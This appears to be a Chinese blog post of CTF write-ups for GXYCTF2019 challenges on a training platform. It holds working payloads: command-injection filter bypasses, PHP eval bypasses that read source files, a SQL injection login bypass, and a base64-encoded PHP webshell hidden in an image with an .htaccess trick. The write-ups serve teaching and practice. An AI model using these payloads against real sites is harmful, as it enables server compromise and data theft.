+++
title = "GXYCTF2019"
slug = "gxyctf2019"
description = "刷"
date = "2024-08-11T19:30:43"
lastmod = "2024-08-11T19:30:43"
image = ""
license = ""
categories = ["复现"]
tags = ["php", "mysql"]
+++

# [GXYCTF2019]Ping Ping Ping

一个`RCE`

```
?ip=127.0.0.1;ls

?ip=127.0.0.1;nl$IFS$1`ls`
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

# [GXYCTF2019]禁止套娃

扫描后台,状态码全为429,估计是`.git`泄露

```
python GitHack.py http://5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81/.git
```

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

第一种是用数组来看元素内容,还有一种类似于极客大挑战的RCE

## 数组操作

`pos() / current()` 默认返回数组第一个元素
`end()` ： 将内部指针指向数组中的最后一个元素，并输出
`next()` ：将内部指针指向数组中的下一个元素，并输出
`prev()` ：将内部指针指向数组中的上一个元素，并输出
`reset()` ： 将内部指针指向数组中的第一个元素，并输出
`each()` ： 返回当前元素的键名和键值，并将内部指针向前移动

`pos()` 输出数组中的当前元素的值。

`localeconv()` 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是"."。

`array_reverse()`函数将数组逆向返回

```
?exp=var_dump(scandir(pos(localeconv())));
array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" }

?exp=var_dump(array_reverse(scandir(pos(localeconv()))));
array(5) { [0]=> string(9) "index.php" [1]=> string(8) "flag.php" [2]=> string(4) ".git" [3]=> string(2) ".." [4]=> string(1) "." }

?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

## session_id

获取session_id值来得到

```
Request:

GET /?exp=highlight_file(session_id(session_start())); HTTP/1.1
Host: 5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
cookie:PHPSESSID=flag.php
Connection: close
```

# [GXYCTF2019]BabySQli

**原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！**

进入页面发现一段base32,解码得到

```sql
select * from user where username = '$name'
```

本地尝试

```sql
select * from user where username = '1'union select 1,'admin','3';
回显是可以查出结果的,也就是说对的上就可以过waf
```

那么我们已知用户名`admin`

数组绕过的原理是`md5`无法正确处理那写个NULL

```
name=1'union select 1,'admin',NULL'&pw[]=123

name=1'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'--+&pw=1
```

# [GXYCTF2019]BabyUpload

```
poc.jpg:

GIF89a66
PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=
```

Apache 中的用户配置文件` .htaccess`

```
.htaccess:

#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
```

就只有`.htaccess`要改包

```
Request:

POST / HTTP/1.1
Host: 11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81
Content-Length: 448
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHvAkitNnbjrpFPs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=f016788420ed0034ee8e12c63ce82728
Connection: close

------WebKitFormBoundarySHvAkitNnbjrpFPs
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
------WebKitFormBoundarySHvAkitNnbjrpFPs
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarySHvAkitNnbjrpFPs--
```

```
/var/www/html/upload/105f4cd49f8eb583ed1fde143caec1d1/.htaccess succesfully uploaded!
/var/www/html/upload/105f4cd49f8eb583ed1fde143caec1d1/poc.jpg succesfully uploaded!
```

然后直接链接`antsword`

```
url:http://11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81/upload/105f4cd49f8eb583ed1fde143caec1d1/poc.jpg
password:a
```

# [GXYCTF2019]StrongestMind

感觉没啥技术,但是是第一次接触这种

```python
import requests
import time
import re

url = "http://aa491c77-bfa4-4503-9a09-8ee6cf93839c.node5.buuoj.cn:81/"
s= requests.session()
key=re.compile(r'\d+ [-|+] \d+')
r=s.get(url=url)

for i in range(1,1001):
    a=key.findall(r.text)[0]   # 匹配第一组:例子 123+456
    aa=eval(a)
    data={"answer":aa}
    time.sleep(0.1)    #避免429
    r=s.post(url=url,data=data)
    r.encoding='utf-8'
    print(r.text)
```

# [GXYCTF2019]BabysqliV3.0

phar反序列化

https://baozongwi.github.io/p/phar-deserialization-analysis/
